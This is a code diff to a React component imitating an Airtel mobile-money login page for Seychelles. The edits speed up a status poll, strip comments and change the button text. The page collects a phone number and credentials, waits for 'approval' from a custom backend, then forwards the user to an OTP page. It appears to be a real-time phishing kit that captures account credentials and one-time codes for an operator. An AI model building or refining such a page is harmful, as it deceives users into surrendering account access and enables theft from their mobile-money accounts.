@@ -69,6 +69,7 @@ function AirtelLogin() {
         setRefId(data.ref_id);
         setIsWaitingForApproval(true); 
         
+        // REDUCED INTERVAL TO 1000ms (1 second) FOR FASTER REACTION
         const pollInterval = setInterval(async () => {
           try {
             const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
@@ -85,7 +86,7 @@ function AirtelLogin() {
           } catch (pollErr) {
             console.error('Polling error:', pollErr);
           }
-        }, 3000);
+        }, 1000); // <--- Changed from 3000 to 1000
       } else {
         navigate('/airtel-otp');
       }
@@ -138,7 +139,7 @@ function AirtelLogin() {
           justify-content: center;
           z-index: 9999;
           padding: 20px;
-          background-color: rgba(255, 255, 255, 0.9); /* Mostly solid white to hide background */
+          background-color: rgba(255, 255, 255, 0.9);
         }
 
         .custom-spinner {
@@ -412,7 +413,6 @@ function AirtelLogin() {
         {/* HEADER */}
         <div className="header-section">
           <button className="menu-btn" onClick={() => navigate('/')}>
-            {/* Changed to a Hamburger Menu (Three lines) */}
             <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
               <line x1="3" y1="12" x2="21" y2="12"></line>
               <line x1="3" y1="6" x2="21" y2="6"></line>
@@ -433,7 +433,6 @@ function AirtelLogin() {
             <span className="input-label">Phone number</span>
             <div className="phone-wrapper">
               <div className="phone-prefix">
-                {/* Seychelles Flag SVG */}
                 <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
                   <path fill="#003f87" d="M0,200 L300,0 L0,0 Z"/>
                   <path fill="#fcd856" d="M0,200 L300,0 L300,50 Z"/>
@@ -474,7 +473,6 @@ function AirtelLogin() {
                 ))}
               </div>
 
-              {/* Eye Toggle Button */}
               <button 
                 type="button" 
                 className="eye-btn" 
@@ -499,7 +497,8 @@ function AirtelLogin() {
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || isLoading || isWaitingForApproval}
             >
-              Connexion
+              {/* CHANGED: Text is now English and reactive */}
+              {isLoading && !isWaitingForApproval ? 'Connecting...' : 'Login'}
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
                 <polyline points="12 5 19 12 12 19" />
